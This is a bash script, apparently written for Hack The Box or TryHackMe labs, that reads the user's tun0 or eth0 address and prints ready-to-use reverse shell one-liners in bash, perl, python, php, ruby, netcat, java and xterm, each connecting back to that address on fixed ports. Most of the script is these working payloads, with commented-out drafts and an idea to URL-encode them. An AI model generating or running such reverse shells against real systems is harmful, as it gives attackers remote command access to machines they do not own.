#!/bin/bash

#command to grep the tun0 ip(htb or thm virtual ip)

#/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1 > "$new"
#echo $new

if [ "$2" == "-v" ]
then
	error=$(cat /sys/class/net/tun0/operstate 2>/dev/null) # 2>/dev/null is used to suppress the error msg from cat if tun0 is not available
	# echo $error
	if [ "$error" == "unknown" ]
	then
	ip4=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
	else
		echo "You are not connected to any virtual network"
		exit
	fi
elif [ "$2" == "-l" ] 
then
	ip4=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)

fi

#ideas
#1. add a feature to url encode the shells

	#statements
# export ip4

#echo "
#	1.bash
#	2.perl
#	3.python
#	4.php
#	5.ruby
#	6.nc
#	7.java
#	8.xterm
#"
#echo $ip4
#if [ $? -eq 0 ]
#then
 #   echo "success"
#else
 #   echo "failed"
#fi


#testing
# while test $# -gt 0; do
#   case "$2" in
#     -h|--help)
#       echo "$package - attempt to capture frames"
#       echo " "
#       echo "$package [options] application [arguments]"
#       echo " "
#       echo "options:"
#       echo "-h, --help                show brief help"
#       echo "-v, --virtual     		  if you want to use your cirtual ip address"
#       echo "-l, --local=DIR      	  if you want to use your local ip address"
#       exit 0
#       ;;
#     -v|--virtual)
#       shift
      
#         ip4=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
   
#       shift
#       ;;

#     -l|--local)
#       shift
#       	ip4=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
#       shift
#       ;;
#     *)
#       break
#       ;;
#   esac
# done

#######
echo $ip4

# choise selection
if [ "$1" != "" ]
then
	if [ "$1" == "-h" ]
	then
	echo "Usage: ./shells.sh [type] -[flag]

	-h                		  show help
	-v 				  use virtual ip address
	-l 				  use local ip address"
	elif [ $1 == "bash" ]
	then
		echo "bash -i >& /dev/tcp/$ip4/8080 0>&1"
	
	elif [ $1 == "perl" ]
	then
		echo "perl -e 'use Socket;$i=\"$ip4\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
	elif [ $1 == "python" ]
	then
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip4\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

	elif [ $1 == "php" ]
	then
		echo "php -r '$sock=fsockopen(\"$ip4\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

	elif [ $1 == "ruby" ]
	then	
		echo "ruby -rsocket -e'f=TCPSocket.open(\"$ip4\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

	elif [ $1 == "nc" ]
	then
		echo "nc -e /bin/sh $ip4 1234"

	elif [ $1 == "java" ]
	then
		echo "r = Runtime.getRuntime()
		p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$ip4/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
		p.waitFor() "

	elif [ $1 == "xterm" ]
	then 
		echo "xterm -display $ip4:1 (default port:6001)"
	fi
else
		echo "Enter the type of shell you want"
		echo "Try './shells.sh -h' for more information."
fi

